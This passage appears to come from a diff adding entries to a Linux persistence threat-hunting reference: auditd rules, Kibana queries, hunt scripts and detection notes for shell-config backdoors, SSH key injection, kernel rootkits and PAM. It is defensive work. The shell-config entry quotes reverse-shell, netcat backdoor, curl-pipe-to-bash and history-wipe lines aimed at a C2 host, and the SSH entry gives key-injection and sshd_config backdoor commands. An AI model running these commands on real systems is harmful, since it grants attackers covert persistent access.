+  done
+
+echo ""
+echo "[*] === Suspicious patterns in all shell configs ==="
+grep -rE \
+  "(curl|wget|nc |ncat|python|/tmp/|/dev/shm/|base64|eval|exec )" \
+  /root/.*rc /root/.*profile /home/*/.*rc /home/*/.*profile \
+  /etc/profile /etc/bash.bashrc /etc/profile.d/ 2>/dev/null
+
+echo ""
+echo "[*] === Recently modified shell configs (7 days) ==="
+find /root /home /etc/profile.d /etc/profile /etc/bash.bashrc \
+  -name ".*rc" -o -name ".*profile" -o -name "*.sh" 2>/dev/null | \
+  xargs ls -lt 2>/dev/null | \
+  awk -v d="$(date -d '7 days ago' +%s)" '{
+    cmd = "date -d \"" $6 " " $7 " " $8 "\" +%s 2>/dev/null"
+    cmd | getline ts; close(cmd)
+    if (ts+0 > d+0) print $0
+  }'`,
+        registry: `Shell initialization file load order (critical for understanding):
+
+Login shell (SSH, console, su -l):
+  /etc/profile              (system-wide, always loaded)
+  /etc/profile.d/*.sh       (system-wide fragments, always loaded)
+  ~/.bash_profile           (user; checked first)
+    OR ~/.bash_login        (user; if .bash_profile absent)
+    OR ~/.profile           (user; if above both absent)
+
+Interactive non-login shell (new terminal, subshell):
+  /etc/bash.bashrc          (system-wide, Debian default)
+  ~/.bashrc                 (user)
+
+Logout:
+  ~/.bash_logout            (on clean logout; used to clear history)
+
+Adversary implications:
+- /etc/profile.d/          : affects ALL users; root-required write
+  Highest impact vector - any user logging in runs this
+- ~/.bashrc                : user-specific; any user account can set
+  Triggered on every new interactive shell (most frequent)
+- ~/.bash_profile           : login-only; SSH sessions hit this
+  Common target for SSH-session persistence
+- ~/.bash_logout            : used to clear bash_history on exit
+  Adversaries may wipe HISTFILE here
+
+Zsh equivalents (if zsh is in use):
+  /etc/zshrc, /etc/zsh/zshrc
+  ~/.zshrc, ~/.zprofile, ~/.zshenv`,
+        tools: `Shell config persistence is broadly used across threat actor categories:
+
+Known APT uses:
+- Numerous threat actors targeting Linux web servers use
+  /etc/profile.d/*.sh for all-user persistence (root access)
+- SSH-focused actors inject into ~/.bash_profile to run
+  payloads when admins SSH in from management systems
+- Insider threat scenarios: ~/.bashrc modifications are
+  simple, effective, and leave minimal artifacts
+
+Common injection patterns:
+  # Minimal footprint - single line append:
+  echo 'bash -i >& /dev/tcp/C2/4444 0>&1 &' >> ~/.bashrc
+
+  # More covert - function override:
+  echo 'ls() { /tmp/.ls_real "$@"; nc -e /bin/bash C2 4444 & }' >> ~/.bashrc
+
+  # Downloader on login:
+  echo 'curl -s http://C2/payload | bash &' >> /etc/profile.d/update.sh
+
+  # HISTFILE wipe on logout:
+  echo 'unset HISTFILE; history -c; rm -f ~/.bash_history' >> ~/.bash_logout
+
+Post-exploitation frameworks:
+- Metasploit: post/linux/manage/shell_profile_persist
+- Empire: linux/persistence/rc_persist
+- PANIX: --shell-profile (tests all shell config paths)
+
+Detection bypass techniques:
+- Hiding payload inside existing function definitions
+- Using Unicode or invisible characters to obscure lines
+- Placing payload at end of file after legitimate content
+- Using source /path/to/hidden/script inside .bashrc`,
+        ossdetect: `Sigma rules:
+- file_event_lnx_shell_rc_modification.yml
+- proc_creation_lnx_susp_shell_rc_exec.yml
+- file_event_lnx_profile_d_script.yml
+
+Wazuh syscheck rules:
+  Rule 100120/100121 (built-in) monitor all shell RC paths;
+  configure syscheck with alert_new_files=yes
+
+Atomic Red Team:
+- T1546.004 Test #1 (append to .bashrc)
+- T1546.004 Test #2 (/etc/profile.d drop)
+- T1546.004 Test #3 (.bash_logout history clear)
+
+PANIX:
+- ./panix.sh --shell-profile
+  Tests .bashrc, .bash_profile, /etc/profile.d/
+  github.com/Aegrah/PANIX
+
+Elastic detection rules:
+- Linux Shell Configuration Modification
+- Shell Profile Modification
+- Potential Shell via Web Server Process
+
+auditd + ausearch:
+- ausearch -k shell_rc_write --start today
+- ausearch --file /etc/profile.d/ --start today`,
+        notes: "Shell configuration backdoors are among the simplest and hardest-to-notice Linux persistence mechanisms because the files are always present and frequently modified by legitimate package managers and users. The detection challenge is identifying unauthorized modifications rather than the files themselves. The /etc/profile.d directory is the highest-impact target - a single .sh file there runs for every user on every login, making it functionally equivalent to a local group policy startup script. It is also one of the most overlooked directories because administrators focus on /etc/profile rather than its fragments directory. Critical case to understand: ~/.bash_logout is frequently used specifically to clear bash history (unset HISTFILE; history -c; rm -f ~/.bash_history) - if you see this in a user's .bash_logout and it wasn't there in the baseline, the attacker is covering tracks. This wipe happens on clean logout, not kill/crash, so it runs on normal SSH session end. For detection in environments without file integrity monitoring, look at shell config file mtimes against the last known legitimate modification (package install, user home creation); unexpected mtime changes post-deployment are strong indicators.",
+        apt: [
+          { cls: "apt-mul", name: "Commodity Linux malware", note: "Shell RC modification is universally used across Linux malware for user-session persistence; lower sophistication actors use this before systemd/cron." },
+          { cls: "apt-mul", name: "Web shell operators", note: "Threat actors with initial access via web shell frequently drop /etc/profile.d scripts for persistent root shell access." },
+          { cls: "apt-ru", name: "Ebury / Windigo", note: "SSH credential harvesting malware targeting hosting providers; shell config modification documented as secondary persistence." }
+        ],
+        cite: "MITRE ATT&CK T1546.004"
+      }
+    ]
+  },
+
+  {
+    id: "T1098.004",
+    name: "Account Manipulation: SSH Authorized Keys",
+    desc: "Injection of attacker-controlled SSH public keys into ~/.ssh/authorized_keys, sshd_config manipulation (AuthorizedKeysFile, PermitRootLogin), and cloud metadata API abuse to push keys to VMs",
+    rows: [
+      {
+        sub: "T1098.004 - SSH Authorized Keys Injection",
+        os: "linux",
+        indicator: "Write to any user's ~/.ssh/authorized_keys outside expected provisioning tools — especially by non-ssh processes, or new key addition without corresponding user creation event",
+        sysmon: `# Auditd rules for authorized_keys modification
+
+# Per-user authorized_keys (catch all home dirs)
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \
+  -F dir=/root/.ssh -F perm=w -k ssh_key_write
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \
+  -F dir=/home -F perm=w -F key=ssh_key_write
+  # Post-filter on filename=authorized_keys in SIEM
+
+# Broader .ssh directory monitoring
+-w /root/.ssh -p wa -k ssh_key_write
+-a always,exit -F arch=b64 -S rename,renameat \
+  -F dir=/root/.ssh -k ssh_key_write
+
+# sshd_config (server-side config change)
+-w /etc/ssh/sshd_config -p wa -k sshd_config_write
+-w /etc/ssh/sshd_config.d -p wa -k sshd_config_write
+
+# ESXi: /etc/ssh/keys-<username>/authorized_keys
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \
+  -F dir=/etc/ssh -F perm=w -k ssh_key_write
+
+# Sysmon for Linux EID 11:
+# TargetFilename matches authorized_keys OR sshd_config`,
+        kibana: `// File integrity — authorized_keys modification
+event.module: "file_integrity"
+AND file.name: "authorized_keys"
+
+// OR broader .ssh directory monitoring
+event.module: "file_integrity"
+AND file.path: (*/.ssh/* OR /etc/ssh/*)
+
+// Auditd key
+event.module: "auditd"
+AND tags: "ssh_key_write"
+
+// Suspicious process writing authorized_keys
+event.module: "auditd"
+AND tags: "ssh_key_write"
+AND NOT process.executable: (
+  "/usr/bin/ssh-copy-id" OR "/usr/bin/scp"
+  OR "/usr/bin/sftp" OR "/usr/libexec/openssh/*"
+  OR "/usr/bin/ansible*" OR "/usr/bin/puppet"
+  OR "/usr/bin/chef-client"
+)
+
+// sshd_config changes — high severity
+event.module: "file_integrity"
+AND file.path: (/etc/ssh/sshd_config OR /etc/ssh/sshd_config.d/*)
+
+// Cloud metadata API-based key injection (EC2/GCP/Azure)
+// Look for IMDSv1/v2 calls followed by authorized_keys write
+process.executable: "/usr/bin/curl"
+AND process.args: (*169.254.169.254* OR *metadata.google* OR *metadata.azure*)
+AND event.type: "process_start"`,
+        powershell: `#!/bin/bash
+# T1098.004 - SSH Authorized Keys Hunt
+
+echo "[*] === Authorized keys - all users ==="
+getent passwd | awk -F: '$7 !~ /nologin|false/ {print $1,$6}' | \
+  while read user homedir; do
+    authfile="$homedir/.ssh/authorized_keys"
+    [ -f "$authfile" ] || continue
+    echo ""
+    echo "--- $user: $authfile ---"
+    cat "$authfile"
+    echo "Key count: $(grep -c '^ssh' "$authfile" 2>/dev/null)"
+    echo "File mtime: $(stat -c '%y' "$authfile")"
+    echo "File permissions: $(stat -c '%a' "$authfile")"
+  done
+
+echo ""
+echo "[*] === Root authorized keys ==="
+cat /root/.ssh/authorized_keys 2>/dev/null
+echo "File mtime: $(stat -c '%y' /root/.ssh/authorized_keys 2>/dev/null)"
+
+echo ""
+echo "[*] === sshd_config settings (potential persistence config) ==="
+sshd -T 2>/dev/null | grep -E \
+  "(permittedopens|permituserenv|authorizedkeysfile|\
+permitrootlogin|passwordauthentication|pubkeyauthentication|\
+allowusers|denyusers|match)"
+
+echo ""
+echo "[*] === AuthorizedKeysFile directive (non-default path) ==="
+grep -i "AuthorizedKeysFile" /etc/ssh/sshd_config \
+  /etc/ssh/sshd_config.d/*.conf 2>/dev/null
+
+echo ""
+echo "[*] === sshd_config changes (hash check) ==="
+dpkg --verify openssh-server 2>/dev/null || \
+  rpm -V openssh-server 2>/dev/null || \
+  echo "Package verify not available"
+
+echo ""
+echo "[*] === Authorized key fingerprints (known-good comparison) ==="
+for homedir in /root /home/*; do
+  authfile="$homedir/.ssh/authorized_keys"
+  [ -f "$authfile" ] || continue
+  echo "--- $authfile ---"
+  while IFS= read -r line; do
+    echo "$line" | ssh-keygen -l -f /dev/stdin 2>/dev/null || true
+  done < "$authfile"
+done
+
+echo ""
+echo "[*] === Active SSH sessions ==="
+who | grep -v "^$"
+ss -tnp | grep ":22"
+last | head -20`,
+        registry: `SSH persistence file locations:
+
+Per-user authorized keys (primary target):
+  ~/.ssh/authorized_keys      - standard path
+  ~/.ssh/authorized_keys2     - legacy alternate path
+  (AuthorizedKeysFile directive in sshd_config controls actual path)
+
+Root's authorized keys (highest value):
+  /root/.ssh/authorized_keys
+
+ESXi-specific:
+  /etc/ssh/keys-<username>/authorized_keys
+
+sshd configuration (server-side backdoor):
+  /etc/ssh/sshd_config
+  /etc/ssh/sshd_config.d/*.conf  - drop-in fragments (modern sshd)
+
+High-risk sshd_config directives:
+  PermitRootLogin yes           - enable root SSH (persistence for root keys)
+  PasswordAuthentication yes    - fall back to password (weakens key security)
+  AuthorizedKeysFile <custom>   - redirect to attacker-controlled file
+  AuthorizedKeysCommand         - execute binary to supply authorized keys
+  PermitTunnel yes              - enables network tunneling
+  GatewayPorts yes              - enables port forwarding from external IPs
+  AllowTcpForwarding yes        - enables TCP forwarding for pivoting
+
+SSH directory permissions (if wrong, sshd may ignore authorized_keys):
+  ~/.ssh         should be 0700 (owner only)
+  authorized_keys should be 0600 (owner read-write only)
+  Adversaries may widen permissions to 0777 - flag this`,
+        tools: `APT actors and malware using SSH key injection:
+
+TeamTNT (mul) - cloud container threat actor; injects SSH keys
+  to compromised Docker hosts for persistent access;
+  documented in Cado Security and Palo Alto reports
+
+UNC3524 (China-nexus) - Mandiant documented SSH key injection
+  to maintain access to mail servers; keys survived password
+  resets because defenders focused on accounts, not SSH config
+
+APT39 (IR) - Iranian espionage group documented using SSH key
+  injection for persistent access to Linux infrastructure
+
+Typhoon-class actors (CN) - Volt/Salt/Silk Typhoon campaigns
+  documented SSH authorized_keys manipulation on network
+  appliances and Linux hosts (CISA advisories 2024-2025)
+
+Skidmap (CN) - Linux cryptominer/rootkit; injects SSH keys as
+  one of multiple persistence mechanisms
+
+Cloud-specific attacks:
+- IMDS (instance metadata service) abuse to push SSH keys
+  via cloud provider APIs (EC2, GCP, Azure) even when
+  host access is not available
+
+Common attacker commands:
+  echo "ssh-rsa AAAA...[attacker pubkey]... comment" \
+    >> ~/.ssh/authorized_keys
+
+  # Force root key injection:
+  mkdir -p /root/.ssh
+  echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
+  chmod 600 /root/.ssh/authorized_keys
+
+  # sshd_config backdoor:
+  echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+  echo "AuthorizedKeysFile /tmp/.ssh_authorized" >> /etc/ssh/sshd_config
+  systemctl restart sshd`,
+        ossdetect: `Sigma rules:
+- file_event_lnx_ssh_authorized_keys_modification.yml
+- file_event_lnx_sshd_config_modification.yml
+- proc_creation_lnx_ssh_auth_keys_manipulation.yml
+
+Elastic detection rules:
+- SSH Authorized Keys File Modified
+- Potential SSH Authorized Keys Tampering
+- SSH Backdoor via sshd_config
+
+Splunk:
+- Linux SSH Authorized Keys Modification
+  (Splunk Security Content, updated March 2026)
+
+Atomic Red Team:
+- T1098.004 Test #1 (append key to authorized_keys)
+- T1098.004 Test #2 (authorized_keys complete overwrite)
+- T1098.004 Test #3 (sshd_config PermitRootLogin)
+
+Velociraptor:
+- Linux.Sys.SSHAuthorizedKeys (enumerate all keys)
+- Linux.Forensics.SSHHostedFiles
+
+AIDE / Tripwire:
+- Configure to monitor ~/.ssh/ and /etc/ssh/sshd_config
+- Any new key line in authorized_keys triggers alert
+
+Package verify (check for sshd_config tampering):
+- dpkg --verify openssh-server (Debian/Ubuntu)
+- rpm -V openssh-server (RHEL/CentOS)
+  (M flag = modified content; 5 = checksum mismatch)`,
+        notes: "SSH authorized_keys injection is one of the most effective and durable Linux persistence mechanisms because it grants interactive shell access that survives password resets, account locks, and even service restarts (sshd reads authorized_keys on each connection attempt). A key injected in an obscure user account's authorized_keys file may persist for months or years if defenders focus remediation only on the primary compromised account. Two underdetected variants deserve special attention: (1) AuthorizedKeysCommand - sshd can be configured to execute a binary to determine authorized keys instead of reading a file; adversaries can set this to a script that always returns their key; (2) AuthorizedKeysFile pointing to an unconventional path - setting this in sshd_config to a world-readable file or a path the adversary controls means key injection persists even if ~/.ssh/ is cleaned. For cloud environments, the attack surface extends to metadata API abuse: AWS SSM, GCP OS Login, and Azure VM extensions can all push SSH public keys to authorized_keys from the control plane, bypassing host-side security controls entirely. Baseline the fingerprints of all authorized keys across your fleet and alert on any unrecognized fingerprint appearing.",
+        apt: [
+          { cls: "apt-cn", name: "UNC3524 / Typhoon actors", note: "SSH key injection documented in long-dwell espionage operations; keys survived password resets because defenders focused on accounts, not key files." },
+          { cls: "apt-ir", name: "APT39 / Charming Kitten", note: "Iranian espionage group; SSH key injection documented for persistent access to compromised Linux servers." },
+          { cls: "apt-mul", name: "TeamTNT", note: "Cloud-targeted threat actor; injects SSH keys into compromised Docker hosts and cloud VMs as part of persistence chain." },
+          { cls: "apt-mul", name: "Skidmap / cryptominers", note: "Linux cryptomining malware with rootkit capability; SSH key injection documented alongside LKM rootkit for defense-in-depth persistence." }
+        ],
+        cite: "MITRE ATT&CK T1098.004"
+      }
+    ]
+  },
+
+  {
+    id: "T1547.006",
+    name: "Boot or Logon Autostart: Kernel Modules and Extensions",
+    desc: "Loadable Kernel Module (LKM) rootkits loaded via insmod/modprobe, persistence via /etc/modules and /etc/modules-load.d/, kernel-level hiding of files, processes, and network connections",
+    rows: [
+      {
+        sub: "T1547.006 - Kernel Module Load and Boot Persistence",
+        os: "linux",
+        indicator: "insmod or modprobe execution loading a module not from /lib/modules/<kernel-version>/, or new entry added to /etc/modules or /etc/modules-load.d/*.conf for boot persistence",
+        sysmon: `# Auditd rules for kernel module load activity
+
+# insmod and modprobe execution
+-a always,exit -F arch=b64 -S execve \
+  -F path=/sbin/insmod -k module_load
+-a always,exit -F arch=b64 -S execve \
+  -F path=/usr/sbin/insmod -k module_load
+-a always,exit -F arch=b64 -S execve \
+  -F path=/sbin/modprobe -k module_load
+-a always,exit -F arch=b64 -S execve \
+  -F path=/usr/sbin/modprobe -k module_load
+
+# init_module and finit_module syscalls (module loading)
+-a always,exit -F arch=b64 -S init_module,finit_module -k module_load
+-a always,exit -F arch=b32 -S init_module,finit_module -k module_load
+
+# delete_module syscall (module unloading - rootkit hiding behavior)
+-a always,exit -F arch=b64 -S delete_module -k module_unload
+-a always,exit -F arch=b32 -S delete_module -k module_unload
+
+# Boot persistence configuration files
+-w /etc/modules -p wa -k module_autoload
+-w /etc/modules-load.d -p wa -k module_autoload
+-w /usr/lib/modules-load.d -p wa -k module_autoload
+
+# Kernel module directory changes (new .ko file drops)
+-w /lib/modules -p wa -k module_file_write
+
+# Sysmon for Linux EID 1: Process create for insmod/modprobe
+# EID 11: FileCreate in /lib/modules/ (new .ko files)`,
+        kibana: `// insmod or modprobe execution (any)
+event.module: "auditd"
+AND tags: "module_load"
+AND process.executable: (*insmod* OR *modprobe*)
+
+// init_module syscall — kernel-level module load
+event.module: "auditd"
+AND auditd.data.syscall: ("init_module" OR "finit_module")
+
+// delete_module syscall — rootkit self-hiding step
+event.module: "auditd"
+AND auditd.data.syscall: "delete_module"
+
+// Sysmon for Linux EID 1 — insmod/modprobe execution
+event.code: "1"
+AND process.executable: (*insmod OR *modprobe)
+
+// New .ko file drop outside package manager paths
+event.module: "file_integrity"
+AND file.path: /lib/modules/*
+AND file.extension: "ko"
+
+// Boot persistence config changes
+event.module: "auditd"
+AND tags: "module_autoload"
+
+// Module load from suspicious path (not /lib/modules/)
+event.module: "auditd"
+AND tags: "module_load"
+AND auditd.log.a0: (*/tmp/* OR */dev/shm/* OR */home/* OR */var/tmp/*)`,
+        powershell: `#!/bin/bash
+# T1547.006 - Kernel Module / LKM Rootkit Hunt
+
+echo "[*] === Currently loaded modules ==="
+lsmod 2>/dev/null | head -50
+echo "Total modules: $(lsmod | wc -l)"
+
+echo ""
+echo "[*] === Module comparison: lsmod vs /sys/module ==="
+# Rootkits may hide from lsmod but remain in /sys/module
+comm -13 \
+  <(lsmod 2>/dev/null | awk 'NR>1{print $1}' | sort) \
+  <(ls /sys/module/ | sort) | \
+  head -20
+
+echo ""
+echo "[*] === Non-package-signed modules ==="
+# Check module signatures
+for mod in $(lsmod | awk 'NR>1{print $1}'); do
+  modpath=$(modinfo "$mod" 2>/dev/null | grep "^filename" | awk '{print $2}')
+  [ -z "$modpath" ] || [ "$modpath" = "(builtin)" ] && continue
+  # Check if in package manager
+  if ! (dpkg -S "$modpath" 2>/dev/null || rpm -qf "$modpath" 2>/dev/null) | grep -q .; then
+    echo "[FLAG] Module not from package: $mod ($modpath)"
+    modinfo "$mod" 2>/dev/null | grep -E "(filename|author|description|license|sig)"
+  fi
+done
+
+echo ""
+echo "[*] === Modules with unsigned/invalid signature ==="
+for mod in $(lsmod | awk 'NR>1{print $1}'); do
+  siginfo=$(modinfo "$mod" 2>/dev/null | grep "^sig_hashalgo")
+  if echo "$siginfo" | grep -qE "(void|none)"; then
+    echo "[FLAG] Unsigned module: $mod"
+  fi
+done
+
+echo ""
+echo "[*] === Boot persistence module config ==="
+echo "--- /etc/modules ---"
+cat /etc/modules 2>/dev/null
+echo "--- /etc/modules-load.d/ ---"
+ls -la /etc/modules-load.d/ 2>/dev/null
+cat /etc/modules-load.d/*.conf 2>/dev/null
+echo "--- /usr/lib/modules-load.d/ ---"
+cat /usr/lib/modules-load.d/*.conf 2>/dev/null
+
+echo ""
+echo "[*] === Module files not in standard /lib/modules tree ==="
+find / -name "*.ko" -not -path "/lib/modules/*" \
+  -not -path "/usr/src/*" -not -path "/proc/*" \
+  -not -path "/sys/*" 2>/dev/null | head -20
+
+echo ""
+echo "[*] === dmesg - module load messages (recent) ==="
+dmesg 2>/dev/null | grep -iE "(module|insmod|rootkit|taint)" | tail -30
+
+echo ""
+echo "[*] === Kernel taint flags ==="
+cat /proc/sys/kernel/tainted
+# 0 = clean; non-zero indicates unsigned/proprietary/OOT module loaded`,
+        registry: `Kernel module persistence locations:
+
+Module files:
+  /lib/modules/<kernel-ver>/kernel/    - package-managed modules
+  /lib/modules/<kernel-ver>/extra/     - DKMS/third-party (legitimate)
+  /lib/modules/<kernel-ver>/updates/   - distribution updates
+
+Boot autoload configuration:
+  /etc/modules                         - Debian/Ubuntu; names only
+  /etc/modules-load.d/*.conf           - modern systemd approach
+  /usr/lib/modules-load.d/*.conf       - package-provided autoload
+
+DKMS (Dynamic Kernel Module Support):
+  /var/lib/dkms/                       - DKMS module builds
+  /etc/dkms/                           - DKMS config
+
+Module blacklist (adversaries may modify to un-blacklist):
+  /etc/modprobe.d/blacklist*.conf      - blacklisted modules
+  /etc/modprobe.d/*.conf               - module options/aliases
+
+Module parameter files:
+  /sys/module/<name>/parameters/       - runtime parameters
+  /sys/module/<name>/                  - module metadata (live)
+
+Kernel taint indicator:
+  /proc/sys/kernel/tainted             - non-zero = compromised kernel
+    Bit 12 (4096) = unsigned module loaded (Secure Boot off)
+
+Rootkit detection indicators:
+  discrepancy: lsmod count != ls /sys/module/ count
+  hidden process: ls /proc/* shows PIDs not in ps
+  hidden file: readdir() != getdents() result count`,
+        tools: `Known LKM rootkits (open-source and used in wild):
+
+Diamorphine:
+  - GitHub: m0nad/Diamorphine
+  - Features: hide processes, files, itself from lsmod
+  - Used by: multiple cryptominer/APT campaigns
+  - Detection bypass: self-removes from module list
+
+Reptile:
+  - GitHub: f0rb1dd3n/Reptile
+  - Features: hidden shell, file/process hiding, ping backdoor
+  - Used by: advanced threat actors, documented in wild
+
+Snapekit:
+  - Modern LKM rootkit using io_uring syscall hooking
+  - Targets recent kernels; evades traditional auditd
+  - Demo'd by Artur Kalinowski 2024
+
+Azazel:
+  - LD_PRELOAD userland rootkit (not LKM but similar goals)
+
+Snake/Turla (RU):
+  - MITRE documents LKM use in long-term espionage
+  - Kernel module used to hide C2 communications
+
+Skidmap (CN-linked):
+  - Cryptominer with LKM rootkit component
+  - Replaces kernel modules for stat/proc hiding
+
+Tools that detect LKM rootkits:
+  rkhunter     - scans for known rootkit signatures
+  chkrootkit   - process/file anomaly checks
+  Volatility   - Linux memory forensics, finds hidden modules
+  AVML         - Azure VM memory acquisition
+  rekall       - kernel structure analysis`,
+        ossdetect: `Sigma rules:
+- proc_creation_lnx_insmod_module_load.yml
+- file_event_lnx_kernel_module_file.yml
+- auditd_kernel_module_load.yml (init_module/finit_module syscalls)
+- auditd_module_autoload_modification.yml
+
+Atomic Red Team:
+- T1547.006 Test #1 (insmod load via path)
+- T1547.006 Test #2 (modprobe unsigned module)
+
+Falco:
+- rule: Kernel Module Load
+  condition: ka.response.code=0 and
+    (ka.req.action.type="load" or evt.type=init_module)
+  Built-in rule; high confidence
+
+Elastic detection rules:
+- Kernel Module Load via Insmod
+- Unusual Kernel Module Load
+- Kernel Module Autoload Configuration Changed
+
+rkhunter (rootkit hunter):
+  rkhunter --check --skip-keypress
+  Checks for known LKM rootkit signatures and file changes
+  rkhunter.sourceforge.net
+
+chkrootkit:
+  chkrootkit
+  Checks proc, lsmod, netstat for hidden entries
+  chkrootkit.net
+
+Volatility3 Linux plugins:
+  linux.check_modules   - find modules hidden from lsmod
+  linux.check_syscall   - find hooked syscall table entries
+  linux.check_idt       - detect interrupt handler tampering
+  linux.pslist          - find processes hidden from ps`,
+        notes: "Kernel module rootkits are the highest-severity Linux persistence mechanism - once loaded, they operate at Ring 0 (kernel privilege level) and can subvert all userland detection tools, including the auditd daemon that's supposed to catch them. The critical detection window is the module load event itself: once a rootkit is running, it can hide its own syscall table hooks, file entries, and module list presence. This makes init_module/finit_module syscall alerting (via auditd) the most important real-time signal - it fires before the rootkit can establish its hooks. The discrepancy technique for hunt mode is powerful: compare lsmod output against /sys/module/ directory listing. Some rootkits remove themselves from the module doubly-linked list (which lsmod reads) but cannot remove their /sys/module/ directory entry without kernel modification. The kernel taint flag in /proc/sys/kernel/tainted is another quick check: any value other than 0 indicates a module loaded that the kernel considers non-clean (unsigned, out-of-tree, or flagged). For investigations on potentially compromised hosts, do not trust userland tools if you suspect an active rootkit - collect a memory image using a trusted binary (AVML, LiME) from a separate storage path and analyze offline with Volatility.",
+        apt: [
+          { cls: "apt-ru", name: "Snake/Turla", note: "MITRE ATT&CK documents Turla using LKM components for long-term persistence and covert C2 communications on Linux servers." },
+          { cls: "apt-cn", name: "Skidmap", note: "Chinese-linked cryptominer with LKM rootkit component; replaces kernel module stat hooks to hide miner processes and network connections." },
+          { cls: "apt-mul", name: "Diamorphine / Reptile users", note: "Open-source LKM rootkits used by multiple financially motivated actors; self-removes from lsmod output to evade casual inspection." },
+          { cls: "apt-mul", name: "Advanced ransomware operators", note: "Enterprise Linux ransomware operators have used LKM persistence to prevent defenders from identifying or removing the staging implant before encryption begins." }
+        ],
+        cite: "MITRE ATT&CK T1547.006"
+      }
+    ]
+  },
+
+  {
+    id: "T1556.003",
+    name: "Modify Authentication Process: Pluggable Authentication Modules (PAM)",
+    desc: "Malicious PAM module insertion (.so) into /lib/security/, backdooring pam_unix.so to accept a master password, PAM config modification to load attacker modules or remove MFA, and credential harvesting through PAM's plaintext access",
+    rows: [
+      {
+        sub: "T1556.003 - Malicious PAM Module and Configuration Backdoor",
+        os: "linux",
+        indicator: "New or modified .so file in PAM module directories (/lib/security/, /lib/x86_64-linux-gnu/security/, /usr/lib/security/), or modification to PAM config files in /etc/pam.d/ or /etc/pam.conf",
+        sysmon: `# Auditd rules for PAM persistence monitoring
+
+# PAM configuration files
+-w /etc/pam.d -p wa -k pam_config_write
+-w /etc/pam.conf -p wa -k pam_config_write
+
+# PAM module directories (shared library drops/replacements)
+-w /lib/security -p wa -k pam_module_write
+-w /lib/x86_64-linux-gnu/security -p wa -k pam_module_write
+-w /lib/aarch64-linux-gnu/security -p wa -k pam_module_write
+-w /usr/lib/security -p wa -k pam_module_write
+-w /usr/lib/x86_64-linux-gnu/security -p wa -k pam_module_write
+-w /usr/lib64/security -p wa -k pam_module_write
+
+# pam_unix.so specifically (most common backdoor target)
+# This is the hash to diff on each run
+# sha256sum /lib/x86_64-linux-gnu/security/pam_unix.so
+
+# dlopen calls that load PAM-path libraries
+# (caught via file access events above)
+
+# compiler invocation to build malicious PAM module
+-a always,exit -F arch=b64 -S execve \
+  -F path=/usr/bin/gcc -k compiler_exec
+-a always,exit -F arch=b64 -S execve \
+  -F path=/usr/bin/cc -k compiler_exec`,
+        kibana: `// PAM configuration file modifications
+event.module: "file_integrity"
+AND file.path: (/etc/pam.d/* OR /etc/pam.conf)
+
+// PAM module directory changes (new .so or replacement)
+event.module: "file_integrity"
+AND file.path: (
+  /lib/security/* OR /lib/x86_64-linux-gnu/security/*
+  OR /usr/lib/security/* OR /usr/lib/x86_64-linux-gnu/security/*
+  OR /usr/lib64/security/*
+)
+
+// Auditd key-based
+event.module: "auditd"
+AND tags: ("pam_config_write" OR "pam_module_write")
+
+// gcc/cc compiler execution (module build step)
+event.module: "auditd"
+AND tags: "compiler_exec"
+AND process.args: (*pam* OR *-shared* OR *-fPIC*)
+
+// New .so file NOT from package manager in PAM paths
+event.module: "file_integrity"
+AND file.path: (*security/* AND *.so)
+AND event.type: "created"
+
+// sshd or su authentication by unexpected parent process
+// (may indicate PAM bypass triggering)
+process.name: ("sshd" OR "su" OR "sudo")
+AND process.exit_code: 0
+AND source.address: NOT IN ["known_admin_IPs"]`,
+        powershell: `#!/bin/bash
+# T1556.003 - PAM Backdoor Hunt
+
+echo "[*] === PAM module integrity check ==="
+echo "Comparing PAM .so files against package manager..."
+
+# Debian/Ubuntu
+if command -v dpkg &>/dev/null; then
+  echo "--- dpkg verify (libpam-runtime, libpam-modules) ---"
+  dpkg --verify libpam-runtime libpam-modules 2>/dev/null
+  # 'M' flag = modified content; '5' = checksum failure
+fi
+
+# RHEL/CentOS
+if command -v rpm &>/dev/null; then
+  echo "--- rpm verify (pam) ---"
+  rpm -V pam 2>/dev/null
+fi
+
+echo ""
+echo "[*] === pam_unix.so hash (primary backdoor target) ==="
+find /lib /usr/lib /usr/lib64 -name "pam_unix.so" 2>/dev/null | \
+  while read f; do
+    echo "$f:"
+    sha256sum "$f"
+    echo "  Package: $(dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null)"
+    echo "  mtime: $(stat -c '%y' "$f")"
+  done
+
+echo ""
+echo "[*] === All PAM module hashes ==="
+find /lib/security /lib/*/security /usr/lib/security \
+  /usr/lib/*/security /usr/lib64/security 2>/dev/null \
+  -name "*.so" | sort | while read f; do
+  echo "$(sha256sum "$f") | mtime: $(stat -c '%y' "$f")"
+done
+
+echo ""
+echo "[*] === Non-package PAM modules (manual drops) ==="
+find /lib/security /lib/*/security /usr/lib/security \
+  /usr/lib/*/security /usr/lib64/security 2>/dev/null \
+  -name "*.so" | while read f; do
+  if ! (dpkg -S "$f" 2>/dev/null || rpm -qf "$f" 2>/dev/null) | grep -q .; then
+    echo "[FLAG] NOT from package manager: $f"
+    ls -la "$f"
+    sha256sum "$f"
+  fi
+done
+
+echo ""
+echo "[*] === PAM configuration files ==="
+for f in /etc/pam.conf /etc/pam.d/*; do
+  [ -f "$f" ] || continue
+  echo "--- $f ---"
+  cat "$f"
+done
+
+echo ""
+echo "[*] === PAM config entries referencing non-standard modules ==="
+grep -rE "^[^#]" /etc/pam.d/ /etc/pam.conf 2>/dev/null | \
+  grep -vE "(pam_unix|pam_limits|pam_env|pam_nologin|pam_selinux|\
+pam_keyinit|pam_motd|pam_lastlog|pam_tty|pam_access|\
+pam_listfile|pam_systemd|pam_permit|pam_deny|\
+pam_faillock|pam_pwquality|pam_cracklib|pam_group)" | \
+  grep -v "^#"
+
+echo ""
+echo "[*] === PAM config recently modified ==="
+find /etc/pam.d /etc/pam.conf -mtime -7 -ls 2>/dev/null`,
+        registry: `PAM module directories (primary targets):
+
+Module shared libraries:
+  /lib/security/                           - 32-bit or generic
+  /lib/x86_64-linux-gnu/security/         - Debian/Ubuntu x86_64
+  /lib/aarch64-linux-gnu/security/        - Debian ARM64
+  /usr/lib/security/                       - RHEL/CentOS
+  /usr/lib/x86_64-linux-gnu/security/     - newer Ubuntu
+  /usr/lib64/security/                     - RHEL x86_64
+
+PAM configuration files:
+  /etc/pam.conf                            - single-file config (legacy)
+  /etc/pam.d/                              - per-service directory
